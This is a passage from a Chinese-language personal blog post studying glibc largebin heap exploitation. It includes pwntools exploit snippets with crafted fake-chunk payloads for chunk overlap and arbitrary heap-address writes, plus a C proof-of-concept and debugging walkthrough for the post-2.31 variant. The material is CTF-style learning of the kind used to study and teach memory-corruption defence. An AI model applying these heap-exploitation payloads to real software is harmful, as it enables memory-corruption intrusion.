<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;1&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x31</span></span><br><span class="line">success(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3    把还在fastbin中的chunk1申请回来 理论上应该不影响 但是在之前chunk extend的时候有影响 所以还是申请出来为妙</span></span><br></pre></td></tr></table></figure>

<p>我们一共需要两个chunk 下面我们分别称这些chunk为chunkA B</p>
<p>chunkA是要放入到largebin中的 并且其要为largebin中最大的chunk 这样修改chunkA的bk_nextsize域才能索引到fake chunk</p>
<p>chunkB则是用来构造fake chunk的</p>
<p>在学习unlink的时候 当时的unlink可以做到任意地址申请 因为最后chunk的ptr和fd、bk域有关</p>
<p>largebin的unlink则是用来申请一个正在使用的chunk 从而导致overlap 为此我们只需要绕过一个判断即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>我们需要使得 fake chunk的fd域或者是bk域指向的地址 以此地址为chunk首地址 其bk域和fd域相应的存放fake chunk的首地址</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303101356658.png" alt="image-20230310135640568"></p>
<p>此时的chunkB的内部构造应该是这个样子 这里之所以在fake_nextsize域后还要再加上fakechunk的首地址 就是为了绕过unlink检查</p>
<p>这里的fakechunk首地址放到哪里都行 只需要修改fd或者bk域  就比如图中的情况来说 我们需要保证这个值+0x20以后的地址存放着fakechunk的首地址 也就是我们需要填入chunkB+0x28 由于unlink的判断只需要满足一个就行 所以图中的构造其实是多余的</p>
<p>还需要注意的是nextsize域需要设置为0 因为如果nextsize域有值 plmalloc就会去申请下一个堆块 而非链表头的堆</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">bss_addr = <span class="number">0x602200</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;1&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x31</span></span><br><span class="line">success(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x470</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x480</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#6</span></span><br><span class="line">chunkB_addr = heap_addr +<span class="number">0x4f0</span></span><br><span class="line">success(<span class="string">&quot;chunkB_addr :&quot;</span>+<span class="built_in">hex</span>(chunkB_addr))</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x481</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(chunkB_addr+<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+p64(<span class="number">0x491</span>)</span><br><span class="line">payload1 = p64(<span class="number">0</span>)+p64(<span class="number">0x481</span>)+p64(chunkB_addr+<span class="number">0x40</span>-<span class="number">0x18</span>)+p64(chunkB_addr+<span class="number">0x40</span>-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(chunkB_addr+<span class="number">0x10</span>)*<span class="number">2</span></span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x480</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = payload+payload1</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># payload = p64(chunkB_addr+0x10)*2</span></span><br><span class="line"><span class="comment"># bss_write(bss_addr,payload)</span></span><br><span class="line">add(<span class="number">0x470</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#8</span></span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>

<p>代码中注释的部分是bss段上构造双向链表 不过感觉正常的题不会给这个机会 也就我自己编写的题会给一个bss_write函数了</p>
<h4 id="修改bk域和bk-nextsize域实现任意地址写堆地址"><a href="#修改bk域和bk-nextsize域实现任意地址写堆地址" class="headerlink" title="修改bk域和bk_nextsize域实现任意地址写堆地址"></a>修改bk域和bk_nextsize域实现任意地址写堆地址</h4><p>这种利用手法的意义在于 fastbin对于申请出来的chunk的大小和对应链表有检测 如果利用这个的话 就可以绕过这个检测</p>
<p>利用的关键在于源码中的这两处地方</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;  <span class="comment">#1</span></span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;  </span><br><span class="line"></span><br><span class="line">fwd-&gt;bk = victim;  <span class="comment">#2</span></span><br></pre></td></tr></table></figure>

<p>第一句 此时的victim指向的是要放入largebin的chunk 其bk_nextsize域的值由fwd的bk_nextsize域决定 </p>
<p>而victim的bk_nextsize指向的地址的fd_nextsize域会存入victim的地址 所以如果我们修改fwd的bk_nextsize域 就可以做到堆地址写</p>
<p>第二句  fwd的bk域指向的地址会存入victim的地址 这里同样可以利用</p>
<p>所以我们只需要修改已经位于largebin中的一个chunk的bk域和bk_nextsize域 同时释放一个size大于其的chunk进入largebin 就可以利用漏洞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bss_addr = <span class="number">0x602200</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(bss_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x430</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>

<p>之所以chunk3的大小要同为可以被释放进largebin 是因为防止过小从chunk0中分配 导致chunk0被放入到unsortedbin 调大chunk0的值同样可行</p>
<p>chunk4的目的在于将chunk2放入到largebin</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303102301110.png" alt="image-20230310230144021"></p>
<p>此时的bss_addr内容如图所示 以0x602200为首地址 两字长后为bk域 是<strong>fwd-&gt;bk &#x3D; victim</strong>的效果 也就是如果我们修改fwd的bk域 那么任意写的地址在于ptr_addr + 0x10</p>
<p>bk_nextsize的值则是<strong>victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim</strong>的效果 也就是我们修改fwd的bk_nextsize域 任意写的地址在于ptr_addr + 0x20</p>
<p>largebin的利用在高版本中还是比较常见的 许多house of系列就是基于largebin的 需要好好掌握</p>
<h3 id="2-31以上漏洞利用"><a href="#2-31以上漏洞利用" class="headerlink" title="2.31以上漏洞利用"></a>2.31以上漏洞利用</h3><p>2.31对于largebin的检查做了一些增强 虽然还是能够largebinattack 往任意地址写堆地址 但是攻击效果没有那么强大了</p>
<p>新版本针对largebin 新增了两个检查 导致我们原本的方法行不通了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd)) malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd) malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>但是还是有办法 原本我们利用的是比largebin中大的chunk放入largebin 引起的那些操作<br>与之相对的 还有小chunk放入largebin中的操作 不过只能往一个地址写入堆地址 相比之攻击效果不够强大 所以一开始没有使用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面就是我们要利用的代码 直接跟着我来源码调试吧  这样就清楚了</p>
<p>我写的POC：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;make by chen&quot;</span>);</span><br><span class="line">  <span class="type">char</span> test_array[<span class="number">0x20</span>];</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x460</span>); <span class="comment">//largebin</span></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//to separate</span></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x450</span>); <span class="comment">//unsortedbin</span></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x450</span>); <span class="comment">//to separate</span></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x470</span>); <span class="comment">//Release p1 into largebin</span></span><br><span class="line">  <span class="built_in">free</span>(p2);  <span class="comment">//Release p2 into unsortedbin</span></span><br><span class="line">  *(p1+<span class="number">3</span>) = test_array<span class="number">-0x20</span>;</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x470</span>); <span class="comment">//Release p2 into largebin</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241311645.png" alt="image-20230324131150506"></p>
<p>申请四个chunk chunk1和4用来防止合并 接着释放chunk0 随后申请一个大chunk 把chunk0放入到largebin中 并且把chunk2也放入到unsortedbin中</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241314475.png" alt="image-20230324131435420"></p>
<p>接着我们需要伪造chunk0的bk_nextsize 将其修改为ptr_addr-0x20 然后把chunk2释放到largebin中 </p>
<p>s进入malloc函数 接着n到int_malloc函数 再次s进入</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241317496.png" alt="image-20230324131722457"></p>
<p>断点打在这三行源代码所在的行数 我所用的源码是3846 然后c到这里即可</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241321052.png" alt="image-20230324132115009"></p>
<p>此时的victim-&gt;fd_nextsize即chunk2的fd_nextsize域  fwd-&gt;fd指向chunk0</p>
<p>执行完这步后 chunk2的fd_nextsize域写入chunk0的地址</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241349144.png" alt="image-20230324134935047"></p>
<p>下一句相当于 chunk2的bk_nextsize域写入chunk0的bk_nextsize域内容</p>
<p>接下来一句就是我们任意写的关键了</p>
<p>往chunk0的bk_nextsize域 以及chunk2的bk_nextsize的fd_nextsize域写入chunk2地址 但是前一句 已经修改了chunk2的bk_nextsize域为chunk0的bk_nextsize域 所以此时是往我们修改的Ptr_addr+0x20写入chunk2地址</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303241356736.png" alt="image-20230324135628692"><br>总结一下 就是修改largebinchunk的bk_nextsize为ptr_addr-0x20 就可以往ptr_addr写入unsortedchunk的地址</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/03/13/house-of-storm/">← Next house of storm</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/03/03/safe-linking/">safe-linking Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="文章目录">≡</a><a id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307062245113.png" alt="Logo"></a><h1 id="Dr"><a href="/">Chen</a></h1><div id="description"><p>Dr.chen</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Largebin%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">Largebin介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Largebin%E4%B8%ADchunk%E7%9A%84%E6%8F%92%E5%85%A5%E5%8F%96%E5%87%BA%E6%9C%BA%E5%88%B6"><span class="toc-number">2.</span> <span class="toc-text">Largebin中chunk的插入取出机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%92%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">插入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E7%90%86%E8%A7%A3"><span class="toc-number">2.1.1.</span> <span class="toc-text">源码理解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">2.1.2.</span> <span class="toc-text">调试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%96%E5%87%BA"><span class="toc-number">2.2.</span> <span class="toc-text">取出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E7%90%86%E8%A7%A3-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">源码理解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">调试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9bk-nextsize%E6%9D%A5%E9%80%A0%E6%88%90overlap"><span class="toc-number">3.0.1.</span> <span class="toc-text">修改bk_nextsize来造成overlap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9bk%E5%9F%9F%E5%92%8Cbk-nextsize%E5%9F%9F%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%A0%86%E5%9C%B0%E5%9D%80"><span class="toc-number">3.0.2.</span> <span class="toc-text">修改bk域和bk_nextsize域实现任意地址写堆地址</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-31%E4%BB%A5%E4%B8%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">2.31以上漏洞利用</span></a></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>